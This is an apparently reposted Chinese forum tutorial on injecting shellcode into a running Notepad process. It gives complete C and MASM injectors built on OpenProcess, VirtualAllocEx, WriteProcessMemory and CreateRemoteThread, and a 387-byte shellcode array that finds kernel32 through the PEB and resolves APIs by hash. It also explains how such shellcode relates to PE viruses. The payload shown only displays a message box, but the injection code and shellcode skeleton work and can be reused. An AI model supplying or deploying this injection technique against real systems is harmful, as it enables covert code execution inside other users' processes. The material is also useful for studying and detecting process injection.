
# ShellCode 的另外一种玩法(远程线程注入 ShellCode)

> 原文：[`www.pediy.com/kssd/pediy08/pediy8-675.htm`](https://www.pediy.com/kssd/pediy08/pediy8-675.htm)

介于小弟技术菜,请各位大哥不要"奸笑"希望可以指点一二

转载请保留版权:by `Anskya` Email:`Anskya@Gmail.com`

这里是说将 ShellCode 代码直接注射到远程进程内部使她运行！

以下代码使用 TASM 和 VC,文章假定各位已经有了一定的编程基础

## 1.远程线程注入原理

先说说远程线程注入原理,以前我们编写远程注入代码的时候总是需要自己计算代码注入到目标进程后的结构,

一般是本地获取 `GetProcAddress`,`LoadLibraryA`,`GetModuleHandle`,`ExitThread` 函数,当然也有的大哥哥是使用本地获取所有函数的指针然后～然后填写代码结构后注入到目标进程的.

小弟不喜欢后者,假定目标进程中没有加载 `user32.dll` 连接库,如果你的代码中刚好有 `MessageBoxA` 这个函数的话,就会引起非法操作(无法读取 XXX 地址),推荐使用第一种方法,这个仅仅是第一步...以下代码演示...仅仅是演示没有填写其他部分

假设注入代码已经获取到 `GetProcAddress`,`LoadLibraryA`,`GetModuleHandle` 地址

```
代码:

* * *

.data
xdll  db 'user32.dll',0
xapi db 'MessageBoxA',0
.code
start:
    push ebx                        
    lea ebx,xdll
    push ebx
    call GetModuleHandle ;纯属无聊才使用 GetModuleHandle 你可以直接使用
    test eax,0                        ;LoadLibraryA
    jnz @@getapi

    lea ebx,xdll
    push ebx
    call LoadLibraryA
@@getapi:
    lea ebx,xapi
    push ebx
    push eax       ;此时 eax 保存的是 u32 的基址
  call GetProcAddress

    push 0
    push 0
    push 0
    push 0
    call eax       ;调用 MessageBoxA 的函数
  pop ebx
end start

* * *

```

也就是说,只需要有了以上两个函数就可以获取你所需要的任意函数

当然恁也可以自己写一个 API 搜索引擎自己用来搜索自己需要的 API 函数

### 第二步:代码重定位,和数据代码结合技术(姑且这么称呼他吧)

面向 ASM 编程...高级语言编写的注入代码,注入前代码都是安排好的

注入代码和病毒代码差不多～第一部当然是要先确定自身在目标进程中的位置

这点 ShellCode 已经做到,我就不在废话了简单的说一下原理吧...

[1].首先确定代码在目标进程中的位置
[2].获取数据地址-ShellCode,PE Virus 一样都需要获取自己需要的一些常量
[3].k32 基址定位--这个几乎所有通用版 ShellCode,和 PE Virus 都需要用到的
[4].开始搜索自身需要使用的 API 函数地址(一遍搜索一遍加载 DLL)
[5].开始代码工作[呵呵～这个就是 ShellCode 或者 PE Virus 的主要工作了]
[6].[恢复/平衡]堆践,清除代码,或者干点别的什么事情

不好意思这里多说了...上面说了这么多废话就是说明自身代码定位很重要~不然就无法确定其他函数地址,数据存放偏移,还有其他过程的地址了

我这里不废话了引用一个最经典的代码自定位的代码好了

```
代码:

* * *

entry:
    call @@delta
@@delta:                              ;edi 不经常用所以就把基址放在这里
    pop edi                              ;也有许多高手不喜欢这么作,因为 ShellCode 和 PEVirus
    sub edi,offset @@delta ;对体积要求比较高.呵呵只是为了演示我这里用用了这个

* * *

```

代码自定位完毕以后剩下的就可以自己获取地址了...具体如何使用看前辈们的资料

代码数据结合技术:`Delphi` 和 `VC` 都可以用内项汇编作到～`Delphi` 简单一点 `VC` 麻烦

`ASM` 最简单了～这里以 `MASM` 为例--`TASM` 和 `NASM`,`FASM` 都很简单直接 `db` 就好了

`MASM` 需要注意一点~`MASM` 太"智能化"了^_^～

```
代码:

* * *

jmp start
szStr db 'Hello World',0
start:
push szStr
call szStr
add esp,4    ;恢复堆践指针----C 函数不会自动恢复

* * *

```

## 2.ShellCode 原理

[1].首先确定代码在目标进程中的位置
[2].获取数据地址-ShellCode,PE Virus 一样都需要获取自己需要的一些常量
[3].k32 基址定位--这个几乎所有通用版 ShellCode,和 PE Virus 都需要用到的
[4].开始搜索自身需要使用的 API 函数地址(一遍搜索一遍加载 DLL)
[5].开始代码工作[呵呵～这个就是 ShellCode 或者 PE Virus 的主要工作了]
[6].[恢复/平衡]堆践,清除代码,或者干点别的什么事情

有了上面的一些知识 ShellCode 的编写就好理解了...这里说的是通用版本的 ShellCode

就是可以在任何操作系统上跑的....和上面的流程一样

ShellCode 和 PE Virus 几乎就没什么区别....原理相通,代码相近...仅仅于一点点区别就是代码结束的地方--ShellCode 没有感染功能..不好意思忘记说了...ShellCode 一般退出都是引用 `ExitThread` 不映象目标程序运行,PE Virus 是 `jmp oep`...

好了说说 ShellCode 编写吧...按照上面的流程,先自定位,然后获取 k32 的基址,

搜索 API(记得先把 `LoadLibraryA` 搜出来!!!这个主要的),然后就可以开始工作了...

恢复堆践等等...具体看前辈们的代码,我这里只是简单的介绍一下...不要意思

## 3.注入实现

上面只是简单的说了一下 ShellCode 原理和注入代码原理,基本上 ShellCode 完全满足我们的需要了,,,好了下面我们来具体实现代码...用 C 写～嘿嘿方便一点呵呵～

ShellCode 为弹出一个 `MessageBoxA` 然后退出当前线程......

ShellCode 是通用版本基本上可以在所有 Windows 系统上跑

C 代码将数据注入到记事本进程测试的时候最好开启记事本

```
代码:

* * *

#include <windows.h>

  int ShellSize = 387;

  unsigned char ShellCode[387] =
  {
    0xE8,0x00,0x00,0x00,0x00,0x5F,0x81,0xEF,0x1E,0x10,0x40,0x00,0x8D,0x87,0x94,0x10,
    0x40,0x00,0x50,0xE8,0x83,0x00,0x00,0x00,0x8D,0x87,0xA5,0x10,0x40,0x00,0x50,0xE8,
    0x77,0x00,0x00,0x00,0x2B,0xC0,0x50,0x8D,0x9F,0x83,0x10,0x40,0x00,0x53,0x8D,0x9F,
    0x5E,0x10,0x40,0x00,0x53,0x50,0xFF,0x97,0xAC,0x10,0x40,0x00,0x6A,0x00,0xFF,0x97,
    0x9D,0x10,0x40,0x00,0xC3,0x5B,0x2A,0x5D,0x20,0x48,0x65,0x6C,0x6C,0x6F,0x20,0x57,
    0x6F,0x72,0x6C,0x64,0x20,0x43,0x6F,0x64,0x65,0x72,0x21,0x20,0x28,0x43,0x29,0x20,
    0x41,0x6E,0x73,0x6B,0x79,0x61,0x2E,0x0D,0x0A,0x00,0x4D,0x73,0x67,0x42,0x6F,0x78,
    0x20,0x42,0x79,0x20,0x41,0x6E,0x73,0x6B,0x79,0x61,0x00,0x6B,0x65,0x72,0x6E,0x65,
    0x6C,0x33,0x32,0x00,0x01,0x92,0x8F,0x05,0x00,0x00,0x00,0x00,0x75,0x73,0x65,0x72,
    0x33,0x32,0x00,0xF7,0x6C,0x55,0xD8,0x00,0x00,0x00,0x00,0x60,0x8B,0x74,0x24,0x24,
    0xE8,0x97,0x00,0x00,0x00,0x68,0xAD,0xD1,0x34,0x41,0x50,0xE8,0x1F,0x00,0x00,0x00,
    0x56,0xFF,0xD0,0x8B,0xD8,0x2B,0xC0,0xAC,0x84,0xC0,0x75,0xFB,0x8B,0xFE,0xAD,0x85,
    0xC0,0x74,0x0A,0x50,0x53,0xE8,0x05,0x00,0x00,0x00,0xAB,0xEB,0xF1,0x61,0xC3,0x60,
    0x8B,0x5C,0x24,0x24,0x8B,0x74,0x24,0x28,0x2B,0xED,0x8B,0xD3,0x03,0x52,0x3C,0x8B,
    0x52,0x78,0x03,0xD3,0x8B,0x42,0x18,0x8B,0x7A,0x1C,0x03,0xFB,0x8B,0x7A,0x20,0x03,
    0xFB,0x52,0x8B,0xD7,0x8B,0x17,0x03,0xD3,0x45,0x60,0x8B,0xF2,0x2B,0xC9,0xAC,0x41,
    0x84,0xC0,0x75,0xFA,0x89,0x4C,0x24,0x18,0x61,0x60,0x2B,0xC0,0xE8,0x51,0x00,0x00,
    0x00,0x3B,0xC6,0x61,0x74,0x08,0x83,0xC7,0x04,0x48,0x74,0x18,0xEB,0xD6,0x5A,0x4D,
    0x8B,0x4A,0x24,0x03,0xCB,0x0F,0xB7,0x04,0x69,0x8B,0x6A,0x1C,0x03,0xEB,0x8B,0x44,
    0x85,0x00,0x03,0xC3,0x89,0x44,0x24,0x1C,0x61,0xC2,0x08,0x00,0x60,0x2B,0xC0,0x64,
    0x8B,0x40,0x30,0x85,0xC0,0x78,0x0C,0x8B,0x40,0x0C,0x8B,0x70,0x1C,0xAD,0x8B,0x40,
    0x08,0xEB,0x09,0x8B,0x40,0x34,0x8D,0x40,0x7C,0x8B,0x40,0x3C,0x89,0x44,0x24,0x1C,
    0x61,0xC3,0x60,0xE3,0x18,0xF7,0xD0,0x32,0x02,0x42,0xB3,0x08,0xD1,0xE8,0x73,0x05,
    0x35,0x20,0x83,0xB8,0xED,0xFE,0xCB,0x75,0xF3,0xE2,0xEC,0xF7,0xD0,0x89,0x44,0x24,
    0x1C,0x61,0xC3
  };

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
  DWORD PID;
  HANDLE Process;
  LPVOID pThread;
  
  //"Notepad" <----此乃记事本的窗口类名
  GetWindowThreadProcessId(FindWindow("Notepad", NULL), &PID);
  Process = OpenProcess(PROCESS_ALL_ACCESS,FALSE,PID);
  pThread = VirtualAllocEx(Process, NULL, ShellSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(Process, pThread, ShellCode, ShellSize, NULL);
  CreateRemoteThread(Process, 0, 0, (LPTHREAD_START_ROUTINE)pThread, NULL, 0, NULL);
  return 0;
}

* * *

```

现在的 ShellCode 编写的都是以全 Windows 版本实现的(至少可以在所有 NT 内核上跑)

如果在 WIn9x 下跑的话还需要 ShellCode 支持还有～使用 EliRT 了～

这里感谢一下:`EliCZ` 叔叔～呵呵~~还有 29A 的高手们..转载保留版权:By `Anskya`

.586

.model flat, stdcall

option casemap :none

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  

include \\masm32\\include\\windows.inc  

include \\masm32\\include\\kernel32.inc  

include \\masm32\\include\\masm32.inc  

include \\masm32\\include\\User32.inc  

includelib \\masm32\\lib\\kernel32.lib  

includelib \\masm32\\lib\\masm32.lib  

includelib \\masm32\\lib\\User32.lib  

include \\masm32\\macros\\macros.asm  

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  

  ShellSize  equ 387  

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  

.data?  

  hInstance  HINSTANCE  ?  

  CommandLine  LPSTR    ?  

  hProcess  HANDLE    ?  

  pThread    LPVOID    ?  

  PID    dword    ?  

  hWndNpd    dword    ?  

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  

.code  

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  

szShellcode DB 0E8H,00H,00H,00H,00H,05FH,081H,0EFH,01EH,010H,040H,00H,08DH,087H,094H,010H  

        DB 040H,00H,050H,0E8H,083H,00H,00H,00H,08DH,087H,0A5H,010H,040H,00H,050H,0E8H  

        DB 077H,00H,00H,00H,02BH,0C0H,050H,08DH,09FH,083H,010H,040H,00H,053H,08DH,09FH  

        DB 05EH,010H,040H,00H,053H,050H,0FFH,097H,0ACH,010H,040H,00H,06AH,00H,0FFH,097H  



```asm
DB 09DH,010H,040H,00H,0C3H,05BH,02AH,05DH,020H,048H,065H,06CH,06CH,06FH,020H,057H
DB 06FH,072H,06CH,064H,020H,043H,06FH,064H,065H,072H,021H,020H,028H,043H,029H,020H
DB 041H,06EH,073H,06BH,079H,061H,02EH,0DH,0AH,00H,04DH,073H,067H,042H,06FH,078H
DB 020H,042H,079H,020H,041H,06EH,073H,06BH,079H,061H,00H,06BH,065H,072H,06EH,065H
DB 06CH,033H,032H,00H,01H,092H,08FH,05H,00H,00H,00H,00H,075H,073H,065H,072H
DB 033H,032H,00H,0F7H,06CH,055H,0D8H,00H,00H,00H,00H,060H,08BH,074H,024H,024H
DB 0E8H,097H,00H,00H,00H,068H,0ADH,0D1H,034H,041H,050H,0E8H,01FH,00H,00H,00H
DB 056H,0FFH,0D0H,08BH,0D8H,02BH,0C0H,0ACH,084H,0C0H,075H,0FBH,08BH,0FEH,0ADH,085H
DB 0C0H,074H,0AH,050H,053H,0E8H,05H,00H,00H,00H,0ABH,0EBH,0F1H,061H,0C3H,060H
DB 08BH,05CH,024H,024H,08BH,074H,024H,028H,02BH,0EDH,08BH,0D3H,03H,052H,03CH,08BH
DB 052H,078H,03H,0D3H,08BH,042H,018H,08BH,07AH,01CH,03H,0FBH,08BH,07AH,020H,03H
DB 0FBH,052H,08BH,0D7H,08BH,017H,03H,0D3H,045H,060H,08BH,0F2H,02BH,0C9H,0ACH,041H
DB 084H,0C0H,075H,0FAH,089H,04CH,024H,018H,061H,060H,02BH,0C0H,0E8H,051H,00H,00H
DB 00H,03BH,0C6H,061H,074H,08H,083H,0C7H,04H,048H,074H,018H,0EBH,0D6H,05AH,04DH
DB 08BH,04AH,024H,03H,0CBH,0FH,0B7H,04H,069H,08BH,06AH,01CH,03H,0EBH,08BH,044H
DB 085H,00H,03H,0C3H,089H,044H,024H,01CH,061H,0C2H,08H,00H,060H,02BH,0C0H,064H
DB 08BH,040H,030H,085H,0C0H,078H,0CH,08BH,040H,0CH,08BH,070H,01CH,0ADH,08BH,040H
DB 08H,0EBH,09H,08BH,040H,034H,08DH,040H,07CH,08BH,040H,03CH,089H,044H,024H,01CH
DB 061H,0C3H,060H,0E3H,018H,0F7H,0D0H,032H,02H,042H,0B3H,08H,0D1H,0E8H,073H,05H
DB 035H,020H,083H,0B8H,0EDH,0FEH,0CBH,075H,0F3H,0E2H,0ECH,0F7H,0D0H,089H,044H,024H
DB 01CH,061H,0C3H
```

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

```asm
WinMain proc hInst:HINSTANCE, hPrevInst:HINSTANCE, CmdLine:LPSTR, CmdShow:DWORD
  invoke FindWindow,SADD("Notepad"),NULL
  mov hWndNpd,eax
  invoke GetWindowThreadProcessId, hWndNpd,addr PID
  invoke OpenProcess, PROCESS_ALL_ACCESS,FALSE,PID
  mov hProcess, eax
  invoke VirtualAllocEx,hProcess, NULL, ShellSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE
  mov pThread, eax
  invoke WriteProcessMemory, hProcess, pThread, offset szShellcode, ShellSize, NULL
  invoke CreateRemoteThread, hProcess, 0, 0, pThread, NULL, 0, NULL
  ret
WinMain endp
```

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

```asm
start:
  invoke GetModuleHandle, NULL
  mov hInstance, eax
  invoke GetCommandLine
  invoke WinMain, hInstance, NULL, eax, SW_HIDE
  invoke ExitProcess, NULL
```

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

```asm
end start
```

;>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
